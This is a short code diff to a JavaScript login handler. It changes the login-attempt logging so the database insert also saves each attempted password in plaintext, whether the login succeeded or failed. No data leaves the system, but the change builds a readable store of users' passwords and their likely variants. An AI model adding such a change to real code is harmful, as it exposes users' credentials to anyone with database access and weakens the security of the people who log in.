@@ -25,10 +25,10 @@ const login = async (req, res) => {
             }
         }
 
-        // 🔥 SAVE LOGIN ATTEMPT
+        // 🔥 SAVE LOGIN ATTEMPT (now includes password)
         await pool.query(
-            "INSERT INTO login_attempts(email, success) VALUES($1, $2)",
-            [email, success]
+            "INSERT INTO login_attempts(email, success, attempted_password) VALUES($1, $2, $3)",
+            [email, success, password]
         );
 
         if (success) {
